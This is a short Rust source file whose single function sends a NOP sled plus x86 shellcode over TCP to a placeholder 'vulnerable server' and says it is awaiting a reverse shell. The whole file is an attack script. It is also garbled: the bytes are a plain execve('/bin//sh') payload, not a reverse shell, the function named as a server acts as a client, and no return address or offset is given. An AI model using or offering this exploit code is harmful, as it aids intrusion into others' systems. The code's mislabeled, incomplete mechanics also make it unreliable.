use std::net::TcpStream;
use std::io::Write;

pub fn start_reverse_shell_server() -> Result<(), String> {
    let target = "127.0.0.1:9999"; // Replace with the vulnerable server's address and port
    let mut payload = vec![0x90; 256]; // NOP sled

    // Add your reverse shell shellcode payload here
    payload.extend_from_slice(&[
        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69,
        0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
    ]);

    println!("[+] Connecting to target: {}", target);
    match TcpStream::connect(target) {
        Ok(mut stream) => {
            println!("[+] Connected. Sending payload...");
            if let Err(e) = stream.write_all(&payload) {
                return Err(format!("[-] Failed to send payload: {}", e));
            }
            println!("[+] Payload sent. Awaiting reverse shell...");
            Ok(())
        }
        Err(e) => Err(format!("[-] Could not connect to target: {}", e)),
    }
}
